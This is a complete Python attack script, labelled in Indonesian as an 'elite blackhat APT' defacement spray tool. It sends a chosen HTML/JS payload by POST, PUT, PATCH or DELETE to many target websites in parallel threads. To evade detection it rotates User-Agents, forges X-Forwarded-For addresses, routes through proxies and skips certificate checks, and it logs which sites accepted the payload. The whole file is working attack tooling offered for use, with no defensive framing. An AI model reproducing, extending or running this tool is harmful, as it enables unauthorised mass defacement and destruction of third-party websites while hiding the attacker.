#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ELITE BLACKHAT APT DEFACEMENT SPRAY TOOL - ENTERPRISE GRADE
------------------------------------------------------------
Versi Professional untuk Operasi Skala Besar.
Fitur:
- Multi-method HTTP (POST, PUT, PATCH, DELETE)
- Smart Retry dengan Jitter (Anti-RateLimit)
- Proxy Support (HTTP/SOCKS5 via requests)
- Advanced Logging (JSON + Text)
- User-Agent Rotation
- Session Pooling & Connection Reuse
- Payload Injection Context Awareness

Author: APT ELITE BLACKHAT
Version: 2.0 (Enterprise Edition)
"""

import os
import sys
import time
import socket
import ssl
import json
import random
import string
import logging
import argparse
from pathlib import Path
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# --- KONFIGURASI GLOBAL APT ---
LOG_FILE = "apt_spray_log.txt"
JSON_LOG_FILE = "apt_spray_results.json"
DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15"
]

class EliteLogger:
    """Logger profesional dengan output ganda: Text dan JSON parsable."""
    def __init__(self, log_file, json_file):
        self.log_file = log_file
        self.json_file = json_file
        
        # Setup Text Logger
        self.logger = logging.getLogger("APTElite")
        self.logger.setLevel(logging.DEBUG)
        
        # Handler File Text
        fh = logging.FileHandler(log_file, encoding='utf-8')
        fh.setLevel(logging.INFO)
        formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
        fh.setFormatter(formatter)
        self.logger.addHandler(fh)
        
        # Handler Console
        ch = logging.StreamHandler(sys.stdout)
        ch.setLevel(logging.INFO)
        ch.setFormatter(formatter)
        self.logger.addHandler(ch)

    def info(self, msg):
        self.logger.info(msg)

    def warning(self, msg):
        self.logger.warning(msg)

    def error(self, msg):
        self.logger.error(msg)

    def debug(self, msg):
        self.logger.debug(msg)

    def log_result(self, url, status_code, message, method, payload_size):
        """Simpan hasil ke format JSON untuk parsing mudah oleh tools lain."""
        result_entry = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "url": url,
            "status_code": status_code,
            "method": method,
            "payload_size": payload_size,
            "message": message
        }
        with open(self.json_file, 'a', encoding='utf-8') as f:
            f.write(json.dumps(result_entry) + "\n")


class DefaceSprayer:
    def __init__(self, payload_content, headers=None, verify_ssl=False, timeout=15, max_threads=20, proxy=None, method="POST"):
        """
        Inisialisasi Sprayer Grade APT.
        
        :param payload_content: String konten HTML/Payload.
        :param headers: Dictionary header tambahan.
        :param verify_ssl: Verifikasi SSL.
        :param timeout: Timeout koneksi.
        :param max_threads: Jumlah thread maksimal.
        :param proxy: Proxy URL (http://user:pass@ip:port).
        :param method: HTTP Method (POST, PUT, PATCH, DELETE).
        """
        self.payload = payload_content
        self.base_headers = headers or {}
        self.verify_ssl = verify_ssl
        self.timeout = timeout
        self.max_threads = max_threads
        self.proxy = proxy
        self.method = method.upper()
        self.session = requests.Session()
        
        # Konfigurasi Retry Adapter untuk koneksi robust
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["POST", "PUT", "PATCH", "DELETE"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("https://", adapter)
        self.session.mount("http://", adapter)

        # Nonaktifkan warning SSL jika perlu
        if not verify_ssl:
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        # Setup Proxy jika ada
        if self.proxy:
            self.session.proxies = {
                'http': self.proxy,
                'https': self.proxy
            }

        self.logger = EliteLogger(LOG_FILE, JSON_LOG_FILE)

    def _get_target_url(self, raw_url):
        parsed = urlparse(raw_url.strip())
        if not parsed.scheme:
            return f"http://{raw_url.strip()}"
        return raw_url.strip()

    def _check_connectivity(self, url):
        try:
            hostname = urlparse(url).hostname
            if not hostname:
                return False
            socket.getaddrinfo(hostname, None)
            return True
        except socket.gaierror:
            return False

    def _rotate_user_agent(self):
        """Rotasi User-Agent untuk menghindari deteksi berbasis UA."""
        ua = random.choice(DEFAULT_USER_AGENTS)
        headers = self.base_headers.copy()
        headers['User-Agent'] = ua
        return headers

    def spray_single(self, url):
        target_url = self._get_target_url(url)
        
        if not self._check_connectivity(target_url):
            return (0, f"[DNS FAIL] {target_url}", "UNKNOWN")

        # Rotasi Header termasuk User-Agent
        current_headers = self._rotate_user_agent()
        
        # Tambahkan header dinamis jika diperlukan (misal: Content-Length dihitung otomatis, tapi kita bisa tambah X-Forwarded-For dll)
        if 'X-Forwarded-For' not in current_headers:
            current_headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

        try:
            # Gunakan method yang dipilih (POST default, tapi bisa PUT/PATCH untuk deface spesifik)
            response = self.session.request(
                method=self.method,
                url=target_url,
                data=self.payload,
                headers=current_headers,
                timeout=self.timeout,
                verify=self.verify_ssl
            )
            
            status_code = response.status_code
            
            # Logika Status Code untuk Defacement
            # 200 OK, 201 Created, 204 No Content (sering dipakai PUT sukses), 301/302 Redirect (bisa jadi berhasil tapi redirect)
            if status_code in [200, 201, 204]:
                msg = f"[SUCCESS] {target_url} -> Status: {status_code} | Method: {self.method}"
                self.logger.info(msg)
                self.logger.log_result(target_url, status_code, "Success", self.method, len(self.payload))
                return (status_code, msg, "SUCCESS")
            elif status_code in [301, 302]:
                # Cek apakah redirect menuju halaman payload? Untuk simplisasi, anggap sukses jika redirect tidak loop
                msg = f"[REDIRECT] {target_url} -> Status: {status_code} | Target: {response.headers.get('Location', 'N/A')} | Method: {self.method}"
                self.logger.info(msg)
                self.logger.log_result(target_url, status_code, "Redirect", self.method, len(self.payload))
                return (status_code, msg, "REDIRECT")
            else:
                msg = f"[FAIL] {target_url} -> Status: {status_code} | Method: {self.method}"
                self.logger.warning(msg)
                self.logger.log_result(target_url, status_code, "Fail", self.method, len(self.payload))
                return (status_code, msg, "FAIL")

        except requests.exceptions.Timeout:
            msg = f"[TIMEOUT] {target_url}"
            self.logger.error(msg)
            self.logger.log_result(target_url, 0, "Timeout", self.method, len(self.payload))
            return (0, msg, "TIMEOUT")
        except requests.exceptions.ConnectionError:
            msg = f"[CONN ERROR] {target_url}"
            self.logger.error(msg)
            self.logger.log_result(target_url, 0, "Connection Error", self.method, len(self.payload))
            return (0, msg, "CONN_ERROR")
        except Exception as e:
            msg = f"[ERROR] {target_url} -> {str(e)}"
            self.logger.error(msg)
            self.logger.log_result(target_url, 0, str(e), self.method, len(self.payload))
            return (0, msg, "ERROR")

    def run_spray(self, targets):
        if isinstance(targets, str) and os.path.isfile(targets):
            with open(targets, 'r', encoding='utf-8') as f:
                urls = [line.strip() for line in f if line.strip()]
        elif isinstance(targets, list):
            urls = targets
        else:
            urls = [t.strip() for t in targets.split('\n') if t.strip()]

        if not urls:
            self.logger.warning("Tidak ada target valid.")
            return

        self.logger.info(f"Memulai Operasi Spray ke {len(urls)} target | Threads: {self.max_threads} | Method: {self.method}")
        
        successful = []
        failed = []
        redirects = []
        other = []

        start_time = time.time()

        # Gunakan ThreadPoolExecutor dengan maksimum workers
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            future_to_url = {executor.submit(self.spray_single, url): url for url in urls}
            
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    status_code, message, category = future.result()
                    if category == "SUCCESS":
                        successful.append(message)
                    elif category == "REDIRECT":
                        redirects.append(message)
                    elif category in ["TIMEOUT", "CONN_ERROR", "ERROR"]:
                        failed.append(message)
                    else:
                        other.append(message)
                except Exception as exc:
                    self.logger.error(f"Target {url} generated an unhandled exception: {exc}")
                    failed.append(f"[UNKNOWN] {url}")

        end_time = time.time()
        duration = end_time - start_time
        
        self.logger.info("-" * 60)
        self.logger.info(f"OPERASI SELESAI! Total Waktu: {duration:.2f} detik")
        self.logger.info(f"Sukses: {len(successful)} | Redirect: {len(redirects)} | Gagal: {len(failed)} | Lainnya: {len(other)}")
        self.logger.info(f"Log Detail: {LOG_FILE}")
        self.logger.info(f"Hasil JSON: {JSON_LOG_FILE}")
        self.logger.info("-" * 60)

        # Simpan ringkasan ke file text juga
        with open("spray_summary.txt", "w", encoding="utf-8") as f:
            f.write(f"Total Time: {duration:.2f}s\n")
            f.write(f"Successful: {len(successful)}\n")
            f.write(f"Redirects: {len(redirects)}\n")
            f.write(f"Failed: {len(failed)}\n")
            f.write("-" * 50 + "\n")
            for res in successful:
                f.write(res + "\n")
            f.write("-" * 50 + "\n")
            for res in redirects:
                f.write(res + "\n")
            f.write("-" * 50 + "\n")
            for res in failed:
                f.write(res + "\n")

def load_payload_from_file(file_path):
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    else:
        raise FileNotFoundError(f"File payload '{file_path}' tidak ditemukan.")

def main():
    parser = argparse.ArgumentParser(description="ELITE BLACKHAT APT DEFACEMENT SPRAY TOOL - ENTERPRISE EDITION")
    parser.add_argument("-p", "--payload", required=True, help="Path ke file payload (HTML/JS) atau string payload langsung.")
    parser.add_argument("-t", "--targets", nargs='+', required=True, help="URL target atau path ke file daftar URL.")
    parser.add_argument("--threads", type=int, default=20, help="Jumlah thread paralel (default: 20).")
    parser.add_argument("--timeout", type=int, default=15, help="Timeout koneksi per request (default: 15s).")
    parser.add_argument("--no-ssl", action="store_true", help="Jangan verifikasi sertifikat SSL.")
    parser.add_argument("--header", action="append", help="Header kustom tambahan (format: 'Key: Value'). Bisa berkali-kali.")
    parser.add_argument("--proxy", help="Proxy URL (http://user:pass@ip:port).")
    parser.add_argument("--method", choices=["POST", "PUT", "PATCH", "DELETE"], default="POST", help="HTTP Method untuk spray (default: POST).")
    
    args = parser.parse_args()

    # Load Payload
    payload_content = ""
    if os.path.exists(args.payload):
        try:
            payload_content = load_payload_from_file(args.payload)
        except Exception as e:
            print(f"Gagal memuat payload: {e}")
            sys.exit(1)
    else:
        payload_content = args.payload

    if not payload_content:
        print("Payload kosong!")
        sys.exit(1)

    # Setup Headers Tambahan
    custom_headers = {}
    if args.header:
        for h in args.header:
            if ':' in h:
                key, val = h.split(':', 1)
                custom_headers[key.strip()] = val.strip()

    # Inisialisasi Sprayer
    sprayer = DefaceSprayer(
        payload_content=payload_content,
        headers=custom_headers,
        verify_ssl=not args.no_ssl,
        timeout=args.timeout,
        max_threads=args.threads,
        proxy=args.proxy,
        method=args.method
    )

    # Jalankan
    sprayer.run_spray(args.targets)

if __name__ == "__main__":
    main()
